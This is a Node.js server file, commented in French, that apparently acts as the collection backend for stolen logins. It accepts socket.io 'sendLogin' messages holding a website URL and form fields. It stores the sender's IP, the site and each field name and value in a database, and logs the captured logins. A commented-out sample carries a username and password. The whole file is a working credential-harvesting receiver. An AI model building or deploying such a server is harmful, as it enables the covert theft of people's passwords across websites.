/*global require, exports*/
"use strict";

var _url = require('url'),
    fs = require('fs'),
    app = require('express')();
    var key = fs.readFileSync('/ssl/key.pem');
    var cert = fs.readFileSync('/ssl/certificate.pem');
    var https_options = {
        key: key,
        cert: cert
    };
    var server = require('https').createServer(https_options, app),
    _io = require("socket.io").listen(server),

    _utils = require("./utils.js"),
    _orm = _utils.orm();


function persisteIp(ip, callback){
    var queryIpAlreadyExist = "SELECT id FROM ip WHERE address= :address";
    _orm.query(queryIpAlreadyExist, { address:ip }, function(data, err){
        if(!err){
            if(data.length === 0){
                // l'address n'existe pas on l'insert
                var queryAddIp = "INSERT INTO ip (address, dateFirstConnection) VALUES(:address, now())";
                _orm.query(queryAddIp, { address:ip});
                var querySelectLastId ="SELECT LAST_INSERT_ID() AS id FROM ip";
                _orm.query(querySelectLastId, null, function(data, err){
                    if(!err){
                        callback(data[0].id);
                    }
                });
            }
            else{
                callback(data[0].id);
            }
        }
    });
}

function persisteWebsite(url, callback) {
    var queryWebsiteAlreadyExist = "SELECT id FROM website WHERE address= :address";
    _orm.query(queryWebsiteAlreadyExist, { address:url }, function(data, err) {
        if (!err) {
            if (data.length === 0) {
                // le site n'existe pas on l'insert
                var queryAddWebsite = "INSERT INTO website (address) VALUES(:address)";
                _orm.query(queryAddWebsite, {address:url}, function(data,err){
                    if(!err){
                        var querySelectLastId ="SELECT LAST_INSERT_ID() AS id FROM website";
                        _orm.query(querySelectLastId, null, function(data, err){
                            if(!err){
                                callback(data[0].id);
                            }
                        });
                    }
                });
            }
            else{
                callback(data[0].id);
            }
        }
    });
}

function persisteLogin(idIp, idWebsite, callback) {
    var queryAddLogin = "INSERT INTO login (date, idIp, idWebsite) VALUES(now(), :idIp, :idWebsite )";
    _orm.query(queryAddLogin, { idIp:idIp, idWebsite:idWebsite}, function(data, err){
        if(!err){
            var querySelectLastId ="SELECT LAST_INSERT_ID() AS id FROM website";
            _orm.query(querySelectLastId, null, function(data, err){
                if(!err){
                    callback(data[0].id);
                }
            });
        }
    });
}

function persisteEnregistrement(idLogin, login) {
    var queryAddEnregistrement = "INSERT INTO enregistrement(name, value, idLogin) VALUES(:name, :value, :idLogin)";
    _utils.foreach(login, function(iEnregistrement, enregistrement){
        if(enregistrement.name && enregistrement.value) {
            _orm.query(queryAddEnregistrement, { name: enregistrement.name, value:enregistrement.value, idLogin:idLogin },null);
        }
    });
}


function persisteData(data) {
    data.url = _url.resolve(data.url, '/');
    persisteIp(data.ip, function(idIp){
        persisteWebsite(data.url, function(idWebsite){
            persisteLogin(idIp, idWebsite, function(idLogin){
                persisteEnregistrement(idLogin, data.login);
                var text = "l'addresse " + data.ip + " a envoyer les login :" + JSON.stringify(data.login);
                console.log(text);
            });
        });
    });



}

function kernel(){
    _io.sockets.on("connection", function (socket) {
        socket.on("sendLogin", function(data){
            if(data && data.url && data.login){
                data.ip = socket.handshake.address.address;
                persisteData(data);
            }
        });
    });
}

kernel();
server.listen(8080);

var data={
    url:'https://stackoverflow.com/questions/9841336/insert-current-date-time-using-now-in-a-field-using-mysql-php',
    ip:'192.168.0.12',
    login:[
        {
            name:'user',
            value:'jules'
        },
        {
            name:'pass',
            value:'hahahahahhahah'
        }
    ]
};
//persisteData(data);